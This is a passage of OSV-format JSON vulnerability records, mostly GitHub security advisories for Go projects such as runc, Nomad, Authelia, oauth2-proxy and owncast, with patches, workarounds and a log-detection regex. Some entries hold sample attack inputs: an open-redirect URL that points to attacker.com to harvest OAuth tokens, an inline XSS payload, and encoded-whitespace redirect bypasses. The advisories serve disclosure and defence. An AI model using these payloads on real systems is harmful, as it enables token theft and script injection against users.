"https://github.com/opencontainers/runc/commit/dde509df4e28cec33b3c99c6cda3d4fd5beafc77"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/f50369af4b571e358f20b139eea52d612eb55eed"}, {"type": "WEB", "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=2241"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/runc"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2021/12/msg00005.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0274"}], "database_specific": {"cwe_ids": ["CWE-190"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-12-06T22:09:36Z", "nvd_published_at": "2021-12-06T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2jhh-5xm2-j4gf", "modified": "2021-12-06T22:11:44Z", "published": "2021-12-10T20:17:55Z", "aliases": ["CVE-2021-43415"], "summary": "Improper Authentication in HashiCorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise up to 1.0.13, 1.1.7, and 1.2.0, with the QEMU task driver enabled, allowed authenticated users with job submission capabilities to bypass the configured allowed image paths. Fixed in 1.0.14, 1.1.8, and 1.2.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43415"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-31-nomad-qemu-task-driver-allowed-paths-bypass-with-job-args/32288"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-12-06T22:11:44Z", "nvd_published_at": "2021-12-03T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rf3m-mhv7-x39f", "modified": "2023-02-13T18:18:48Z", "published": "2021-12-20T16:58:22Z", "aliases": ["CVE-2015-5250"], "summary": "Denial of Service in OpenShift Origin", "details": "The API server in OpenShift Origin 1.0.5 allows remote attackers to cause a denial of service (master process crash) via crafted JSON data", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/origin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-5250"}, {"type": "WEB", "url": "https://github.com/openshift/origin/issues/4374"}, {"type": "WEB", "url": "https://github.com/openshift/origin/commit/dace5075e31b74703e944b6b3ebe8836be8d1b9a"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2015:1736"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2015-5250"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1259867"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5250"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:21:13Z", "nvd_published_at": "2015-09-08T15:59:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-68wm-pfjf-wqp6", "modified": "2023-01-18T16:44:31Z", "published": "2021-12-20T16:57:16Z", "aliases": ["CVE-2021-32637"], "summary": "Authentication bypassed with malformed request URI on nginx", "details": "### Impact\nThis affects uses who are using nginx ngx_http_auth_request_module with Authelia, it allows a malicious individual who crafts a malformed HTTP request to bypass the authentication mechanism. It additionally could theoretically affect other proxy servers, but all of the ones we officially support except nginx do not allow malformed URI paths.\n\n### Patches\nThe problem is rectified entirely in v4.29.3. As this patch is relatively straightforward we can back port this to any version upon request. Alternatively we are supplying a git patch to 4.25.1 which should be relatively straightforward to apply to any version, the git patches for specific versions can be found below.\n\n<details><summary>Patch for 4.25.1:</summary><p>\n\n```patch\nFrom ca22f3d2c44ca7bef043ffbeeb06d6659c1d550f Mon Sep 17 00:00:00 2001\nFrom: James Elliott <james-d-elliott@users.noreply.github.com>\nDate: Wed, 19 May 2021 12:10:13 +1000\nSubject: [PATCH] fix(handlers): verify returns 200 on malformed request\n\nThis is a git patch for commit at tag v4.25.1 to address a potential method to bypass authentication in proxies that forward malformed information to Authelia in the forward auth process. Instead of returning a 200 this ensures that Authelia returns a 401 when this occurs.\n---\n internal/handlers/handler_verify.go | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a/internal/handlers/handler_verify.go b/internal/handlers/handler_verify.go\nindex 65c064ce..4dd9702d 100644\n--- a/internal/handlers/handler_verify.go\n+++ b/internal/handlers/handler_verify.go\n@@ -396,7 +396,9 @@ func VerifyGet(cfg schema.AuthenticationBackendConfiguration) middlewares.Reques\n \t\ttargetURL, err := getOriginalURL(ctx)\n \n \t\tif err != nil {\n-\t\t\tctx.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err), operationFailedMessage)\n+\t\t\tctx.Logger.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err))\n+\t\t\tctx.ReplyUnauthorized()\n+\n \t\t\treturn\n \t\t}\n \n-- \n2.31.1\n```\n\n</p></details>\n\n### Workarounds\nThe most relevant workaround is upgrading. **If you need assistance with an upgrade please contact us on [Matrix](https://riot.im/app/#/room/#authelia:matrix.org) or [Discord](https://discord.authelia.com).** Please just let us know you're needing help upgrading to above 4.29.2. \n\nYou can add an block which fails requests that contains a malformed URI in the internal location block. We have crafted one that should work in most instances, it basically checks no chars that are required to be URL-encoded for either the path or the query are in the URI. Basically this regex checks that the characters between the square braces are the only characters in the $request_uri header, if they exist, it returns a HTTP 401 status code. The characters in the regex match are tested to not cause a parsing error that would result in a failure, however they are not exhaustive since query strings seem to not always conform to the RFC.\n\n<details><summary>authelia.conf:</summary><p>\n\n```nginx\nlocation /authelia {\n    internal;\n    # **IMPORTANT**\n    # This block rejects requests with a 401 which contain characters that are unable to be parsed.\n    # It is necessary for security prior to v4.29.3 due to the fact we returned an invalid code in the event of a parser error.\n    # You may comment this section if you're using Authelia v4.29.3 or above. We strongly recommend upgrading.\n    # RFC3986: http://tools.ietf.org/html/rfc3986\n    # Commentary on RFC regarding Query Strings: https://www.456bereastreet.com/archive/201008/what_characters_are_allowed_unencoded_in_query_strings/\n    if ($request_uri ~ [^a-zA-Z0-9_+-=\\!@$%&*?~.:#'\\;\\(\\)\\[\\]]) {\n        return 401;\n    }\n\n    # Include the remainder of the block here. \n}\n````\n\n</p></details>\n\n### Discovery\n\nThis issue was discovered by:\n\nSiemens Energy\nCybersecurity Red Team\n\n- Silas Francisco\n- Ricardo Pesqueira\n\n\n### Identifying active exploitation of the vulnerability\n\nThe following regex should match log entries that are an indication of the vulnerability being exploited:\n```regex\nlevel=error msg=\"Unable to parse target URL: Unable to parse URL (extracted from X-Original-URL header)?.*?: parse.*?net/url:.*github\\.com/authelia/authelia/internal/handlers/handler_verify\\.go\n```\n\nExample log entry ***with*** X-Original-URL configured:\n```log\ntime=\"2021-05-21T16:31:15+10:00\" level=error msg=\"Unable to parse target URL: Unable to parse URL extracted from X-Original-URL header: parse \\\"https://example.com/\": net/url: invalid control character in URL\" method=GET path=/api/verify remote_ip=192.168.1.10 stack=\"github.com/authelia/authelia/internal/middlewares/authelia_context.go:65 (*AutheliaCtx).Error\\ngithub.com/authelia/authelia/internal/handlers/handler_verify.go:431     VerifyGet.func1\\ngithub.com/authelia/authelia/internal/middlewares/authelia_context.go:50 AutheliaMiddleware.func1.1\\ngithub.com/fasthttp/router@v1.3.12/router.go:414                         (*Router).Handler\\ngithub.com/authelia/authelia/internal/middlewares/log_request.go:14      LogRequestMiddleware.func1\\ngithub.com/valyala/fasthttp@v1.24.0/server.go:2219                       (*Server).serveConn\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:223                    (*workerPool).workerFunc\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:195                    (*workerPool).getCh.func1\\nruntime/asm_amd64.s:1371                                                 goexit\"\n```\n\nExample log entry ***without*** X-Original-URL configured:\n```log\ntime=\"2021-05-21T16:30:17+10:00\" level=error msg=\"Unable to parse target URL: Unable to parse URL https://example.com/: parse \\\"https://example.com/\": net/url: invalid control character in URL\" method=GET path=/api/verify remote_ip=192.168.1.10 stack=\"github.com/authelia/authelia/internal/middlewares/authelia_context.go:65 (*AutheliaCtx).Error\\ngithub.com/authelia/authelia/internal/handlers/handler_verify.go:431     VerifyGet.func1\\ngithub.com/authelia/authelia/internal/middlewares/authelia_context.go:50 AutheliaMiddleware.func1.1\\ngithub.com/fasthttp/router@v1.3.12/router.go:414                         (*Router).Handler\\ngithub.com/authelia/authelia/internal/middlewares/log_request.go:14      LogRequestMiddleware.func1\\ngithub.com/valyala/fasthttp@v1.24.0/server.go:2219                       (*Server).serveConn\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:223                    (*workerPool).workerFunc\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:195                    (*workerPool).getCh.func1\\nruntime/asm_amd64.s:1371                                                 goexit\"\n```\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a [Discussion](https://github.com/authelia/authelia/discussions)\n* Email us at [security@authelia.com](mailto:security@authelia.com)\n\n### Edit / Adjustment\n\nThis CVE has been edited adjusting the score to more accurately reflect the guidance in the [official CVSS 3.1 guide](https://www.first.org/cvss/specification-document). Under close evaluation the score we originally assigned to this CVE is inappropriate in two clearly identifiable criteria:\n\n- Complexity (Low -> High): This attack requires the administrator be using NGINX's auth_request module. This means the attack cannot be exploited at will but rather requires a pre-condition separate to the vulnerable system, and requires the attacker have gathered knowledge about the system for this likely to be exploited.\n - Availability (High -> None): This attack does not alter availability directly.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/authelia/authelia/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "4.0.0-alpha1"}, {"fixed": "4.29.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 4.29.2"}}], "references": [{"type": "WEB", "url": "https://github.com/authelia/authelia/security/advisories/GHSA-68wm-pfjf-wqp6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32637"}, {"type": "WEB", "url": "https://github.com/authelia/authelia/commit/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda"}, {"type": "PACKAGE", "url": "https://github.com/authelia/authelia"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-28T18:08:47Z", "nvd_published_at": "2021-05-28T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qqxw-m5fj-f7gv", "modified": "2021-05-24T21:20:17Z", "published": "2021-12-20T18:02:38Z", "aliases": ["CVE-2020-5233"], "summary": "The pattern '/\\domain.com' is not disallowed when redirecting, allowing for open redirect", "details": "### Impact\nAn open redirect vulnerability has been found in `oauth2_proxy`. Anyone who uses `oauth2_proxy` may potentially be impacted. \n\nFor a context [detectify] have an in depth blog post about the potential impact of an open redirect. Particularly see the OAuth section.\n\n**tl;dr**: People's authentication tokens could be silently harvested by an attacker. e.g:\n`facebook.com/oauth.php?clientid=123&state=abc&redirect_url=https://yourdomain.com/red.php?url%3dhttps://attacker.com/`\n\n### Patches\n\n@sauyon found the issue, and has submitted a patch. \n\n```\ndiff --git a/oauthproxy.go b/oauthproxy.go\nindex 72ab580..f420df6 100644\n--- a/oauthproxy.go\n+++ b/oauthproxy.go\n@@ -517,7 +517,7 @@ func (p *OAuthProxy) GetRedirect(req *http.Request) (redirect string, err error)\n // IsValidRedirect checks whether the redirect URL is whitelisted\n func (p *OAuthProxy) IsValidRedirect(redirect string) bool {\n \tswitch {\n-\tcase strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\"):\n+\tcase strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !strings.HasPrefix(redirect, \"/\\\\\"):\n \t\treturn true\n \tcase strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n \t\tredirectURL, err := url.Parse(redirect)\n```\n\nThis patch will be applied to the next release, which is scheduled for when this is publicly disclosed.\n\n### Workarounds\n\nAt this stage there is no work around.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/oauth2-proxy/oauth2-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-qqxw-m5fj-f7gv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5233"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2_proxy/commit/a316f8a06f3c0ca2b5fc5fa18a91781b313607b2"}, {"type": "WEB", "url": "https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2_proxy/releases/tag/v5.0.0"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:20:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2x32-jm95-2cpx", "modified": "2021-06-01T17:58:22Z", "published": "2021-12-20T17:52:12Z", "aliases": ["CVE-2020-27847"], "summary": "Authentication Bypass in dex", "details": "A vulnerability exists in the SAML connector of the github.com/dexidp/dex library used to process SAML Signature Validation. This flaw allows an attacker to bypass SAML authentication. The highest threat from this vulnerability is to confidentiality, integrity, as well as system availability. This flaw affects dex versions before 2.27.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dexidp/dex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.27.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/dexidp/dex/security/advisories/GHSA-m9hp-7r99-94h5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-27847"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1907732"}, {"type": "WEB", "url": "https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/"}], "database_specific": {"cwe_ids": ["CWE-228", "CWE-290"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-06-01T17:58:22Z", "nvd_published_at": "2021-05-28T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gp4j-w3vj-7299", "modified": "2021-05-20T16:22:33Z", "published": "2021-12-20T18:21:43Z", "aliases": ["CVE-2016-9962"], "summary": "Information Exposure in RunC", "details": "RunC allowed additional container processes via 'runc exec' to be ptraced by the pid 1 of the container.  This allows the main processes of the container, if running as root, to gain access to file-descriptors of these new processes during the initialization and can lead to container escapes or modification of runC state before the process is fully placed inside the container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.0.0-rc2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9962"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/50a19c6ff828c58e5dab13830bd3dacde268afe5"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/5d93fed3d27f1e2bab58bad13b180a7a81d0b378"}, {"type": "WEB", "url": "https://access.redhat.com/security/vulnerabilities/cve-2016-9962"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1012568#c6"}, {"type": "WEB", "url": "https://github.com/docker/docker/releases/tag/v1.12.6"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BQAXJMMLRU7DD2IMG47SR2K4BOFFG7FZ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FINGBFMIXBG6B6ZWYH3TMRP5V3PDBNXR/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UVM7FCOQMPKOFLDTUYSS4ES76DDM56VP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WUQ3MQNEL5IBZZLMLR72Q4YDCL2SCKRK/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/201701-34"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-9962"}, {"type": "WEB", "url": "http://rhn.redhat.com/errata/RHSA-2017-0116.html"}, {"type": "WEB", "url": "http://rhn.redhat.com/errata/RHSA-2017-0123.html"}, {"type": "WEB", "url": "http://rhn.redhat.com/errata/RHSA-2017-0127.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2017/Jan/21"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2017/Jan/29"}, {"type": "WEB", "url": "http://www.securityfocus.com/archive/1/540001/100/0/threaded"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/95361"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:22:33Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w6v2-qchm-grj7", "modified": "2021-05-24T17:12:01Z", "published": "2021-12-20T18:25:46Z", "aliases": ["CVE-2020-25039"], "summary": "Insecure permissions on user namespace / fakeroot temporary rootfs in Singularity", "details": "### Impact\n\nInsecure permissions on temporary directories used in fakeroot or user namespace container execution.\n\nWhen a Singularity action command (run, shell, exec) is run with the fakeroot or user namespace option, Singularity will extract a container image to a temporary sandbox directory. Due to insecure permissions on the temporary directory it is possible for any user with access to the system to read the contents of the image. Additionally, if the image contains a world-writable file or directory, it is possible for a user to inject arbitrary content into the running container.\n\n### Patches\n\nThis issue is addressed in Singularity 3.6.3.\n\nAll users are advised to upgrade to 3.6.3.\n\n### Workarounds\n\nThe issue is mitigated if `TMPDIR` is set to a location that is only accessible to the user, as any subdirectories directly under `TMPDIR` cannot then be accessed by others. However, this is difficult to enforce so it is not recommended to rely on this as a mitigation.\n\n### For more information\n\nGeneral questions about the impact of the advisory / changes made in the 3.6.0 release can be asked in the:\n\n* [Singularity Slack Channel](https://bit.ly/2m0g3lX)\n* [Singularity Mailing List](https://groups.google.com/a/lbl.gov/forum/??sdf%7Csort:date#!forum/singularity)\n\nAny sensitive security concerns should be directed to: security@sylabs.io\n\nSee our Security Policy here: https://sylabs.io/security-policy", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.2.0"}, {"fixed": "3.6.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-w6v2-qchm-grj7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-25039"}, {"type": "WEB", "url": "https://medium.com/sylabs"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00070.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00088.html"}], "database_specific": {"cwe_ids": ["CWE-668", "CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T17:12:01Z", "nvd_published_at": "2020-09-16T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5m6c-jp6f-2vcv", "modified": "2021-05-24T20:58:18Z", "published": "2021-12-20T17:58:59Z", "aliases": ["CVE-2020-4037"], "summary": "Open Redirect in OAuth2 Proxy", "details": "### Impact\nAs users can provide a redirect address for the proxy to send the authenticated user to at the end of the authentication flow. This is expected to be the original URL that the user was trying to access.\nThis redirect URL is checked within the proxy and validated before redirecting the user to prevent malicious actors providing redirects to potentially harmful sites.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/oauth2-proxy/oauth2-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.1.1"}, {"fixed": "6.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-5m6c-jp6f-2vcv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-4037"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/commit/ee5662e0f5001d76ec76562bb605abbd07c266a2"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/releases/tag/v6.0.0"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T20:58:18Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2hfj-cxw7-g45p", "modified": "2022-01-04T18:54:05Z", "published": "2021-12-14T21:48:16Z", "aliases": ["CVE-2021-39183"], "summary": "Unsafe inline XSS in pasting DOM element into chat", "details": "### Impact\n\nInline scripts are executed when Javascript is parsed via a paste action.\n\n1. Open https://watch.owncast.online/\n2. Copy and then paste `<img src=null onerror=alert('hello')>` into the\nchat field.\n3. An alert should pop up.\n\n### Patches\n```\n    \u22ee 13 \u2502    // Content security policy\n    \u22ee 14 \u2502    csp := []string{\n    \u22ee 15 \u2502        \"script-src 'self' 'sha256-2HPCfJIJHnY0NrRDPTOdC7AOSJIcQyNxzUuut3TsYRY='\",\n    \u22ee 16 \u2502        \"worker-src 'self' blob:\", // No single quotes around blob:\n    \u22ee 17 \u2502    }\n```\n\nWill be patched in 0.0.9 by blocking `unsafe-inline` Content Security Policy and specifying the `script-src`.  The `worker-src` is required to be set to `blob` for the video player.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [owncast/owncast](https://github.com/owncast/owncast/issues)\n* Email us at [gabek@real-ity.com](mailto:gabek@real-ity.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/owncast/owncast"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/owncast/owncast/security/advisories/GHSA-2hfj-cxw7-g45p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39183"}, {"type": "PACKAGE", "url": "https://github.com/owncast/owncast"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-12-14T20:16:10Z", "nvd_published_at": "2021-12-14T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f3w5-v9xx-rp8p", "modified": "2021-05-20T20:10:47Z", "published": "2021-12-20T18:17:41Z", "aliases": [], "summary": "Signature verification failure in Tendermint", "details": "_The root cause of this security vulnerability is in the Tendermint specification, and this advisory is a duplicate of https://github.com/tendermint/spec/security/advisories/GHSA-jqfc-687g-59pw._\n\n\n### Impact\nTendermint light clients running versions 0.34.0 to 0.34.8 are unable to detect and punish a new kind of attack. We\u2019re calling this a \u201cforward lunatic attack,\u201d or FLA. The severity of this vulnerability is _moderate_. \n\nNote that an FLA cannot be successfully executed unless there are already \u2153+ Byzantine validators, and therefore outside of Tendermint\u2019s security model; however, it is important to be able to detect and punish these kinds of attacks in order to incentivize correct behavior.\n\nIn an FLA, an attacking validator (with \u2153+ voting power) signs commit messages for arbitrary application state associated with a block height that hasn\u2019t been seen yet, hence the name \u201cforward lunatic attacks.\u201d A malicious validator effectively executes a [lunatic attack](https://docs.tendermint.com/master/spec/light-client/accountability/#the-misbehavior-of-faulty-validators), but signs messages for a target block that is higher than the current block. This can be dangerous: Typically, misbehavior evidence is only created when there are conflicting blocks at the same height, but by targeting a block height that is far \u201cahead\u201d of the current chain height, it\u2019s possible that the chain will not produce a (conflicting) block at the target height in time to create evidence. \n\nPrior to Tendermint v0.34.9, the light client could accept a bad header from its primary witness, and would not be able to form evidence of this deception, even if all the secondary witnesses were correct. Because the light client is responsible for verifying cross-chain state for IBC, a successful FLA could result in loss of funds. However, it is important to note that FLAs are only possible outside the Tendermint security model. \n\nAll FLAs, attempted and successful, leave traces of provable misbehavior on-chain. A faulty header contains signatures from the faulty validator, and even in unpatched versions of Tendermint Core, networks could use social consensus (off-chain action) to recover the network. The patches introduced in Tendermint Core v0.34.9 handle all evidence automatically and on-chain. \n\nNote that this fix also allows for successful automatic reporting of FLAs, even after a chain halt. By adding a time to FetchBlock, light clients effectively have a backup way to determine if a halted chain should have continued, and it will be able to submit evidence as soon as the chain resumes. \n\n### Patches\nThis problem has been patched in Tendermint Core v0.34.9. \n\n### Workarounds\nThere are no workarounds. All users are recommended to upgrade to Tendermint Core v0.34.9 at their earliest possible convenience. \n\n### Credits\n\nThank you to @MaximilianDiez for originally surfacing this issue, and to @cmwaters, @josef-widder, and @milosevic for creating fixes at both the implementation and specification level.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [tendermint/tendermint](https://github.com/tendermint/tendermint)\n* Email us at [security@tendermint.com](mailto:security@tendermint.com)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.34.0"}, {"fixed": "0.34.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tendermint/tendermint/security/advisories/GHSA-f3w5-v9xx-rp8p"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:10:47Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-vj54-cjrx-x696", "modified": "2023-09-29T17:24:54Z", "published": "2021-12-09T19:59:24Z", "aliases": ["CVE-2020-11576"], "summary": "Observable Discrepancy in Argo", "details": "Fixed in v1.5.1, Argo version v1.5.0 was vulnerable to a user-enumeration vulnerability which allowed attackers to determine the usernames of valid (non-SSO) accounts because /api/v1/session returned 401 for an existing username and 404 otherwise.\n\n### Specific Go Packages Affected\ngithub.com/argoproj/argo-cd/util/session\ngithub.com/argoproj/argo-cd/server/session", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.1"}]}], "versions": ["1.5.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-11576"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/pull/3215"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/35a7350b7444bcaf53ee0bb11b9d8e3ae4b717a1"}, {"type": "WEB", "url": "https://www.soluble.ai/blog/argo-cves-2020"}], "database_specific": {"cwe_ids": ["CWE-203"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-25T18:19:26Z", "nvd_published_at": "2020-04-08T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j7px-6hwj-hpjg", "modified": "2021-05-24T21:05:58Z", "published": "2021-12-20T17:59:10Z", "aliases": ["CVE-2020-11053"], "summary": "Open Redirect in OAuth2 Proxy", "details": "### Impact\nAs users can provide a redirect address for the proxy to send the authenticated user to at the end of the authentication flow. This is expected to be the original URL that the user was trying to access.\nThis redirect URL is checked within the proxy and validated before redirecting the user to prevent malicious actors providing redirects to potentially harmful sites.\n\nHowever, by crafting a redirect URL with HTML encoded whitespace characters (eg. `%0a`, `%0b`,`%09`,`%0d`) the validation could be bypassed and allow a redirect to any URL provided.\n\n### Patches\n@rootxharsh and @iamnoooob provided this patch as potential solution:\n```\nFrom 4b941f56eda310b5c4dc8080b7635a6bfabccad4 Mon Sep 17 00:00:00 2001\nFrom: Harsh Jaiswal 